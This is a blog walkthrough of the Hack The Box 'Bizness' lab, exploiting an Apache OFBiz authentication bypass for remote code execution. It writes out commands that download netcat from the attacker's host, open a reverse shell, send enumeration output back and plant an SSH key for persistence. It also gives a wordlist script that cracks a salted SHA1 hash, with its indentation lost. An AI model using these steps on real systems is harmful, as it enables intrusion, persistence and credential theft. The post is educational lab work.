<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Bizness - Authentication bypass and SSRF. | emdeh</title> <meta name="author" content=" "> <meta name="description" content="Bizness - Hack The Box walkthrough."> <meta name="keywords" content="cybersecurity, ai, technology cyber"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?19f3075a2d19613090fe9e16b564e1fe" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%91%A8%E2%80%8D%F0%9F%92%BB&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://emdeh.github.io/blog/2024/bizness-walkthrough/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?e74e74bf055e5729d44a7d031a5ca6a5" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?96d6b3e1c3604aca8b6134c7afdd5db6"></script> <script src="/assets/js/dark_mode.js?9b17307bb950ffa2e34be0227f53558f"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/">emdeh</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">Repositories</a> </li> <li class="nav-item "> <a class="nav-link" href="/library/">Library</a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus</a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item" href="/blog/category/htb-machines">HTB-Machines</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/essential-eight/">Essential Eight</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/artificial-intelligence/">Artificial Intelligence</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/explainers/">Explainers</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Bizness - Authentication bypass and SSRF.</h1> <p class="post-meta">January 23, 2024</p> <p class="post-tags"> <a href="/blog/2024"> <i class="fas fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/easy-box"> <i class="fas fa-hashtag fa-sm"></i> easy-box</a>   <a href="/blog/tag/htb"> <i class="fas fa-hashtag fa-sm"></i> HTB</a>   <a href="/blog/tag/ctf"> <i class="fas fa-hashtag fa-sm"></i> CTF</a>   <a href="/blog/tag/ssrf"> <i class="fas fa-hashtag fa-sm"></i> SSRF</a>   <a href="/blog/tag/authentication-bypass"> <i class="fas fa-hashtag fa-sm"></i> authentication-bypass</a>   <a href="/blog/tag/persistence"> <i class="fas fa-hashtag fa-sm"></i> persistence</a>   <a href="/blog/tag/linpeas"> <i class="fas fa-hashtag fa-sm"></i> linpeas</a>     ·   <a href="/blog/category/htb-machines"> <i class="fas fa-tag fa-sm"></i> HTB-Machines</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h1 id="introduction">Introduction</h1> <p>Bizness is an easy box with a relatively convoluted privilege escalation that is not-so-easy. It involves enumerating a web application running an open-source enterprise resource planning (ERP) system called <strong>Apache OFBiz</strong>. The ERP has an <strong>authentication bypass</strong> vulnerability that allows for a subsequent an <strong>Server Side Request Forgery (SSRF)</strong> vulnerability to be exploited to obtain a reverse shell.</p> <p>From there the system is enumerated manually and with the help of Linpeas to locate a custom-salted hash. Once the hash is cracked, it is just a matter of switching to the root user to obtain the final flag.</p> <h2 id="methods">Methods</h2> <h3 id="authentication-bypass">Authentication bypass</h3> <p>An authentication bypass vulnerability is a security flaw that allows an attacker to access a system, application, or network without going through the standard authentication process. This type of vulnerability effectively undermines the security mechanisms that verify the identity of a user or entity, granting unauthorized access.</p> <p>Key aspects of an authentication bypass vulnerability include:</p> <ol> <li> <p><strong>Bypassing Security Checks:</strong> The attacker finds a way to circumvent or exploit weaknesses in the authentication process, such as exploiting code flaws, misconfigurations, or logic errors.</p> </li> <li> <p><strong>Unauthorised Access:</strong> As a result, the attacker gains access to restricted areas of the system or application, often with the same privileges as a legitimate user.</p> </li> <li> <p><strong>Potential Impact:</strong> This can lead to various security issues, such as data breaches, privilege escalation, and system compromise.</p> </li> <li> <p><strong>Common Causes:</strong> Causes might include inadequate input validation, insecure direct object references, or flawed session management.</p> </li> </ol> <h3 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h3> <p>Server-Side Request Forgery (SSRF) is a type of web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. This vulnerability occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing an attacker to manipulate the requests made by the server.</p> <p>In an SSRF attack, the attacker can:</p> <ol> <li> <p><strong>Access Services Inaccessible to the Public:</strong> The attacker can target internal systems behind firewalls that are normally inaccessible from the external network, including services running on the server itself (like databases or internal web applications).</p> </li> <li> <p><strong>Manipulate Requests:</strong> The attacker might manipulate the server to send requests to unintended locations, possibly leading to information disclosure, privilege escalation, or other malicious activities.</p> </li> <li> <p><strong>Conduct Port Scanning:</strong> SSRF can be used to scan ports and find services running on servers within the organization’s internal network.</p> </li> <li> <p><strong>Exploit Vulnerable Services and APIs:</strong> If the internal systems have vulnerabilities, SSRF can provide a pathway for exploiting these vulnerabilities.</p> </li> </ol> <p>Mitigating SSRF typically involves validating and sanitizing all user input, especially URLs, implementing strict access controls, and using allowlists for external services that the application can interact with.</p> <p>SSRF is a significant security concern in modern web applications, especially those that interact with complex systems and external services.</p> <h2 id="tools">Tools</h2> <ul> <li> <strong>Nmap</strong> for initial network enumeration.</li> <li> <strong><a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass" rel="external nofollow noopener" target="_blank">CVE-2023-51467 POC</a>)</strong> for vulnerability scanning and initial access.</li> <li> <strong><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" rel="external nofollow noopener" target="_blank">Linpeas</a></strong> for system enumeration.</li> <li> <strong><a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969" rel="external nofollow noopener" target="_blank">Custom python script</a></strong> to convert custom SHA hash.</li> </ul> <h2 id="tactics">Tactics</h2> <ul> <li> <strong>Establishing persistence</strong> via rogue SSH keys.</li> </ul> <hr> <h1 id="enumeration">Enumeration</h1> <p>As always, enumeration begins with an Nmap scan.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.8.141 | <span class="nb">tee </span>nmap-output.txt    
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>10.129.8.141
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span class="o">(</span>RSA<span class="o">)</span>
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
|_http-title: Did not follow redirect to https://bizness.htb/
| ssl-cert: Subject: <span class="nv">organizationName</span><span class="o">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span class="o">=</span>Some-State/countryName<span class="o">=</span>UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>66.11 seconds
                                                                
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Three ports open: <ul> <li>22</li> <li>80</li> <li>443</li> </ul> </li> <li>Domain name http://bizness.htb</li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>The domain <code class="language-plaintext highlighter-rouge">bizness.htb</code> can be added to the local hosts file:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.8.141 bizness.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div> <p>This makes it reachable and reveals a simple landing page:</p> <p><img src="/assets/img/20240123-bizness/20240123-page.png" alt="20240123-page.png" class="auto-resize"></p> <p>At the bottom of the page, it states the site is powered by <strong>Apache OFBiz</strong>.</p> <p><img src="/assets/img/20240123-bizness/20240123-pagepower.png" alt="20240123-pagepower.png" class="auto-resize"></p> <h3 id="what-is-apache-ofbiz">What is Apache OFBiz</h3> <p>Apache OFBiz (Open For Business) is an open-source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise. OFBiz includes modules for inventory management, order management, customer relationship management (CRM), e-commerce, accounting, and supply chain management, among others.</p> <p>A Google search for <em>Apache OFBiz vulnerabilities</em> returns a critical zero-day (CVE-2023-51467).</p> <h3 id="what-is-cve-2023-51467">What is CVE-2023-51467</h3> <p>CVE-2023-51467 is a critical vulnerability in Apache OFBiz, involving an authentication bypass with a CVSS score of 9.8. The vulnerability, particularly affecting the <code class="language-plaintext highlighter-rouge">/webtools/control/ping</code> HTTP endpoint, allows unauthorised access without authentication.</p> <p>While initially demonstrating the vulnerability’s existence, further analysis revealed its potential for arbitrary code execution, including executing payloads directly from memory. This flaw enables attackers not only to bypass authentication but also to potentially exploit Server-Side Request Forgery (SSRF) vulnerabilities.</p> <hr> <h2 id="apache-ofbiz-enumeration">Apache OFBiz enumeration</h2> <p>Without knowing the version of Apache OFBiz, it is unclear whether the target is vulnerable to the zero-day. However, a search of GitHub revealed numerous PoCs to scan a target to confirm or deny if the ERP is vulnerable.</p> <p>One such scanner is <a href="https://github.com/Chocapikk/CVE-2023-51467" rel="external nofollow noopener" target="_blank"> Chocapikk/CVE-2023-51467: Apache OfBiz Auth Bypass Scanner for CVE-2023-51467</a>, which was used to confirm the target is, in fact, vulnerable.</p> <p>First the scanner is cloned from the repository and the dependencies installed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>git clone https://github.com/Chocapikk/CVE-2023-51467.git

pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt 
</code></pre></div></div> <p>Then the scanner can be executed by passing the domain and an output location. The output location is useful if a list of domains were being scanned. As the output shows, the <code class="language-plaintext highlighter-rouge">bizness.htb</code> is indeed vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py <span class="nt">-u</span> bizness.htb <span class="nt">-o</span> ~/Documents/htb-machines/bizness/scans/output.txt
<span class="o">[</span>00:00:49] Vulnerable URL found: bizness.htb, Response: PONG                                                                                                                  exploit.py:53
|████████████████████████████████████████| 1/1 <span class="o">[</span>100%] <span class="k">in </span>3.3s <span class="o">(</span>0.30/s<span class="o">)</span> 

</code></pre></div></div> <hr> <h1 id="exploitation">Exploitation</h1> <p>Another exploit scanner which includes an exploit POC as well was found.</p> <p>Using <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass" rel="external nofollow noopener" target="_blank">jakabakos/Apache-OFBiz-Authentication-Bypass</a> the target was reconfirmed to be vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>python3 exploit.py <span class="nt">--url</span> http://bizness.htb                                                                                                          │
<span class="o">[</span>+] Scanning started...                                                                                                                                  │
<span class="o">[</span>+] Apache OFBiz instance seems to be vulnerable.  
</code></pre></div></div> <p>This particular POC included the exploit itself, which will provide <strong>remote code execution</strong> on the target. Theoretically this can be leveraged to induce the server to request a payload from a malicious server. In this instance, it can be used to move <code class="language-plaintext highlighter-rouge">netcat</code> onto the target to establish a reverse-shell.</p> <p>To do this <code class="language-plaintext highlighter-rouge">nc</code> can be copied to a working directory:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/bin/nc ./
</code></pre></div></div> <p>Then a simple python webserver can be started to serve the binary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div> <p>Once <code class="language-plaintext highlighter-rouge">netcat</code> is ready to be served, the exploit can be used to remotely execute a command on the target to fetch binary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py <span class="nt">--url</span> http://bizness.htb <span class="nt">--cmd</span> <span class="s2">"wget http://10.10.14.5/nc"</span>  

<span class="o">[</span>+] Generating payload...                                                               
Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true</span>           
<span class="o">[</span>+] Payload generated successfully.                                                     
<span class="o">[</span>+] Sending malicious serialized payload...                                             
<span class="o">[</span>+] The request has been successfully sent. Check the result of the command.   
</code></pre></div></div> <p>Now that <code class="language-plaintext highlighter-rouge">netcat</code> is on the target, a listener can be established on a local machine to receive a reverse-shell.<sup><a href="#note1" id="ref1">1</a></sup></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 4321
</code></pre></div></div> <p>Once a listener is active, a subsequent command can be sent to the target which will execute <code class="language-plaintext highlighter-rouge">netcat</code> on the target to establish the reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py <span class="nt">--url</span> https://bizness.htb <span class="nt">--cmd</span> <span class="s2">"nc 10.10.14.5 4321 -c /bin/bash"</span>
</code></pre></div></div> <p>The reverse shell is then caught by the listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 4321  
listening on <span class="o">[</span>any] 4321 ...
connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.8.141] 38270
<span class="nb">whoami
</span>ofbiz
</code></pre></div></div> <p>Once the reverse-shell is established, it can be upgraded with a simple python script to improve the interactivity.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">import pty;pty.spawn(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>
</code></pre></div></div> <p>A quick look around and the first flag is found.</p> <p><img src="/assets/img/20240123-bizness/20240123-userflag.png" alt="20240123-userflag.png" class="auto-resize"></p> <hr> <h1 id="establishing-persistence">Establishing persistence</h1> <p>It can be helpful to establish persistence on a target to ensure it can be easily accessed without having to exploit it again through the initial vulnerability. This can help evade detection and ensure access in the event the initial attack vector is mitigated.</p> <p>One way to do this is to place an <strong>authorized ssh key</strong> on the target.</p> <p>To do this, the <code class="language-plaintext highlighter-rouge">.ssh</code> folder is required in the <code class="language-plaintext highlighter-rouge">/home/ofbiz</code> directory.</p> <p>Within this folder an <code class="language-plaintext highlighter-rouge">authorized_keys</code> file is needed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> .ssh

<span class="nb">cd</span> .ssh

<span class="nb">touch </span>authorized_keys
</code></pre></div></div> <p>On the machine from which the target will be accessed, <strong>ssh keys</strong> are required.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen

Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/ofbiz/.ssh/id_rsa<span class="o">)</span>: 

Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 

Enter same passphrase again: 

Your identification has been saved <span class="k">in</span> /home/ofbiz/.ssh/id_rsa
Your public key has been saved <span class="k">in</span> /home/ofbiz/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:&lt;REDACTED&gt;+
</code></pre></div></div> <p>Then the public key needs to be copied over and placed in the <code class="language-plaintext highlighter-rouge">/home/ofbiz/.ssh/authorized_keys</code> file. This can be achieved with:</p> <p><code class="language-plaintext highlighter-rouge">echo "contents-of-public-key" &gt; /home/ofbiz/.ssh/authorized_keys</code></p> <p>Then the private key needs <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> permission, which will enable ssh login with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /path/to/private0-key ofbiz@IP
</code></pre></div></div> <p>As long as the key remains in the authorized_keys file, this method can be used to return to the target as required.</p> <hr> <h1 id="system-enumeration">System enumeration</h1> <p>Enumerating the system for a vector to achieve privilege escalation was rather challenging for an easy box.</p> <h2 id="linepeas">Linepeas</h2> <p>A good starting point is to move <code class="language-plaintext highlighter-rouge">linpeas</code> onto the system and execute it. The binary can be moved over using the <code class="language-plaintext highlighter-rouge">python -m http.server</code>.</p> <p>Once there it can be ran with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash linpeas.sh | <span class="nb">tee </span>output.txt
</code></pre></div></div> <p>This will send the output to both the console and a txt file for later review.</p> <p>The output can be sent back to a local machine using <code class="language-plaintext highlighter-rouge">netcat</code> again.</p> <p>Firstly start another <code class="language-plaintext highlighter-rouge">netcat</code> listener on the receiving machine:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 4321 <span class="o">&gt;</span> ~/path/to/a/receiving/file.txt
</code></pre></div></div> <p>Then, on the target, send the file using:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.14.5 4321 &lt; output.txt
</code></pre></div></div> <p>This series of commands essentially streams the contents of the output.txt on the target machine, back to the output.txt file on the receiving machine.</p> <h2 id="file-searching">File searching</h2> <p>Reviewing the Linpeas output eventually leads to a writeable directory <code class="language-plaintext highlighter-rouge">/opt/ofbiz/runtime/data/derby</code></p> <p>After much reading, it was found in an <a href="https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide" rel="external nofollow noopener" target="_blank">Apache wiki</a> that OFBiz uses an embedded Java database called <strong>Derby</strong>.</p> <p><img src="/assets/img/20240123-bizness/20240123-wikiresearch.png" alt="20240123-wikiresearch.png" class="auto-resize"></p> <p>After reviewing the file system structure, an interesting README is located: inside the database directory.</p> <p><img src="/assets/img/20240123-bizness/20240123-readme-warning.png" alt="20240123-readme-warning.png" class="auto-resize"></p> <p>The <code class="language-plaintext highlighter-rouge">seg0</code> database contains a number of .dat files.</p> <blockquote> <p><em>ChatGPT was kind enough to explain that .dat files in the context of Apache OFBiz are used for data loading purposes. Given the README notice, it’s possible that these files might contain credentials.</em></p> </blockquote> <p>The command <code class="language-plaintext highlighter-rouge">find seg0 -type f -exec cat {} \; &gt; dir.txt</code> can be used to create a file that contains the combined contents of all the files found in the <code class="language-plaintext highlighter-rouge">seg0</code> directory and its subdirectories.<sup><a href="#note2" id="ref2">2</a></sup></p> <p>This can be useful for consolidating data or logs spread across multiple files into a single document for easier analysis or review.</p> <p>The command <code class="language-plaintext highlighter-rouge">strings dir.txt | grep SHA</code> can then be used to extract printable strings from the consolidated file and search for any occurrence of text. After many attempts, the string “SHA” was tried.</p> <p>This revealed a hash.</p> <p><img src="/assets/img/20240123-bizness/20240123-hash.png" alt="20240123-hash.png" class="auto-resize"></p> <p>The hash has a salt and would need to be converted to hexadecimal to be cracked by Hashcat.</p> <p>Despite trying to do this with the help of ChatGPT, I was unable to obtain a hash that was suitable for Hashcat.</p> <p>In the end, I found a python script that was able to do this, thanks to this <a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969" rel="external nofollow noopener" target="_blank">write up</a>.</p> <p>The script is:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">hashlib</span>  
<span class="kn">import</span> <span class="n">base64</span>  
<span class="kn">import</span> <span class="n">os</span>  
<span class="k">def</span> <span class="nf">cryptBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">hash_type</span><span class="p">:</span>  
<span class="n">hash_type</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SHA</span><span class="sh">"</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">salt</span><span class="p">:</span>  
<span class="n">salt</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>  
<span class="n">hash_obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hash_type</span><span class="p">)</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>  
<span class="n">hashed_bytes</span> <span class="o">=</span> <span class="n">hash_obj</span><span class="p">.</span><span class="nf">digest</span><span class="p">()</span>  
<span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">$</span><span class="si">{</span><span class="n">hash_type</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">salt</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">hashed_bytes</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>  
<span class="k">return</span> <span class="n">result</span>  
<span class="k">def</span> <span class="nf">getCryptedBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>  
<span class="k">try</span><span class="p">:</span>  
<span class="n">hash_obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hash_type</span><span class="p">)</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>  
<span class="n">hashed_bytes</span> <span class="o">=</span> <span class="n">hash_obj</span><span class="p">.</span><span class="nf">digest</span><span class="p">()</span>  
<span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">hashed_bytes</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span>  
<span class="k">except</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">NoSuchAlgorithmException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
<span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error while computing hash of type </span><span class="si">{</span><span class="n">hash_type</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>  
<span class="n">hash_type</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SHA1</span><span class="sh">"</span>  
<span class="n">salt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">d</span><span class="sh">"</span>  
<span class="n">search</span> <span class="o">=</span> <span class="sh">"</span><span class="s">REDACTED</span><span class="sh">"</span>  
<span class="n">wordlist</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/usr/share/wordlists/rockyou.txt</span><span class="sh">'</span>  
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">latin-1</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">password_list</span><span class="p">:</span>  
<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">password_list</span><span class="p">:</span>  
<span class="n">value</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>  
<span class="n">hashed_password</span> <span class="o">=</span> <span class="nf">cryptBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="c1"># print(hashed_password)  
</span><span class="k">if</span> <span class="n">hashed_password</span> <span class="o">==</span> <span class="n">search</span><span class="p">:</span>  
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Found Password:</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s">, hash:</span><span class="si">{</span><span class="n">hashed_password</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
